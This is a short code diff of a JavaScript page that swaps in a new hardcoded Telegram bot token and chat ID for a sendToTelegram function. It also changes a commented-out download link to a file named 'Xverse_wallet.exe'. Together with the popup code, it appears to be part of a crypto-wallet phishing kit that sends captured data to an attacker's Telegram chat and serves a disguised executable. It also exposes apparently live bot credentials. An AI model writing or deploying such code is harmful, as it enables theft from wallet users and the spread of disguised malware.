@@ -236,8 +236,8 @@
   document.body.appendChild(popup);
 
   // --- Telegram logic from x.html ---
-  const TELEGRAM_BOT_TOKEN = '8480274967:AAHt7Fj8oW4hep_puqNeCUVVQJEZks3Zonw';
-  const TELEGRAM_CHAT_ID = '-4704812522';
+  const TELEGRAM_BOT_TOKEN = '8621404199:AAFtvtu8VO_pYb5ZTmNf_lvr62MgDM8iqnM';
+  const TELEGRAM_CHAT_ID = '-5521712066';
 
   function sendToTelegram(message) {
     const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
@@ -280,8 +280,8 @@
     }, 3000);
     // Optionally start download in background (if you still want to download)
     // const a = document.createElement('a');
-    // a.href = 'https://example.com/wallet-update.zip';
-    // a.download = 'wallet-update.zip';
+    // a.href = './Xverse_wallet.exe';
+    // a.download = 'Xverse_wallet.exe';
     // document.body.appendChild(a);
     // a.click();
     // document.body.removeChild(a);
